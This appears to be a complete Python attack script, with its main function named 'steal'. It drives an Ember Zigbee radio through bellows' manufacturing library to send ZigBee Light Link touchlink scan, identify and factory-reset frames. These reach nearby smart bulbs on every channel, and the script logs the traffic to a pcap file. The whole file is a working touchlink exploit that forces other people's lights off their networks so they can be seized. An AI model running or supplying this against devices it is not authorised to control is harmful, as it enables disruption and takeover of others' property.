import asyncio
import pure_pcapy
import time
import sys

from random import randint

import bellows
import bellows.cli.util as util
import interpanZll

class Prompt:
    def __init__(self, loop=None):
        self.loop = loop or asyncio.get_event_loop()
        self.q = asyncio.Queue(loop=self.loop)
        self.loop.add_reader(sys.stdin, self.got_input)

    def got_input(self):
        asyncio.ensure_future(self.q.put(sys.stdin.readline()), loop=self.loop)

    @asyncio.coroutine
    def __call__(self, msg, end='\n', flush=False):
        print(msg, end=end, flush=flush)
        return (yield from self.q.get()).rstrip('\n')


def steal(device):
    s = yield from util.setup(device, baudrate=57600)
    eui64 = yield from getattr(s, 'getEui64')()
    eui64 = bellows.types.named.EmberEUI64(*eui64)

    v = yield from s.mfglibStart(True)
    util.check(v[0], "Unable to start mfglib")

    DLT_IEEE802_15_4 = 195
    pcap = pure_pcapy.Dumper("log.pcap", 128, DLT_IEEE802_15_4)
    prompt = Prompt()


    def dumpPcap(frame):
        ts = time.time()
        ts_sec = int(ts)
        ts_usec = int((ts - ts_sec) * 1000000)
        hdr = pure_pcapy.Pkthdr(ts_sec, ts_usec, len(frame), len(frame))
        pcap.dump(hdr, frame)


    def cb(frame_name, response):
        if frame_name != "mfglibRxHandler":
            return

        data = response[2]
        dumpPcap(data)

        resp = interpanZll.ScanResp.deserialize(data)[0]
        if resp.transactionId == transaction_id:
            targets.add(resp.extSrc)
            frame = interpanZll.AckFrame(seq = resp.seq).serialize()
            dumpPcap(frame)
            s.mfglibSendPacket(frame)

    cbid = s.add_callback(cb)

    for channel in range(11, 27):
        print("Scanning on channel",channel)
        v = yield from s.mfglibSetChannel(channel)
        util.check(v[0], "Unable to set channel")

        transaction_id = randint(0, 0xFFFFFFFF)
        targets = set()

        # https://www.nxp.com/docs/en/user-guide/JN-UG-3091.pdf section 6.8.5
        frame = interpanZll.ScanReq(
            seq = 1,
            srcPan = 0,
            extSrc = eui64,
            transactionId = transaction_id,
        ).serialize()
        dumpPcap(frame)
        r = yield from s.mfglibSendPacket(frame)
        util.check(v[0], "Unable to send packet")

        yield from asyncio.sleep(1)

        while len(targets)>0:
            target = targets.pop()
            frame = interpanZll.IdentifyReq(
                seq = 2,
                srcPan = 0,
                extSrc = eui64,
                transactionId = transaction_id,
                extDst = target,
                frameControl = 0xCC21,
            ).serialize()
            dumpPcap(frame)
            yield from s.mfglibSendPacket(frame)
            answer = yield from prompt("Do you want to factory reset the light that just blinked? [y|n] ")

            if answer.strip().lower() == "y":
                print("Factory resetting "+str(target))
                frame = interpanZll.FactoryResetReq(
                    seq = 3,
                    srcPan = 0,
                    extSrc = eui64,
                    transactionId = transaction_id,
                    extDst = target,
                    frameControl = 0xCC21,
                ).serialize()
                dumpPcap(frame)
                yield from s.mfglibSendPacket(frame)
                yield from asyncio.sleep(1)

    s.remove_callback(cbid)

    v = yield from s.mfglibEnd()

    s.close()

if len(sys.argv) != 2:
    print("syntax:", sys.argv[0], "/dev/ttyUSB0")
    sys.exit(1)

loop = asyncio.get_event_loop()
loop.run_until_complete(steal(sys.argv[1]))

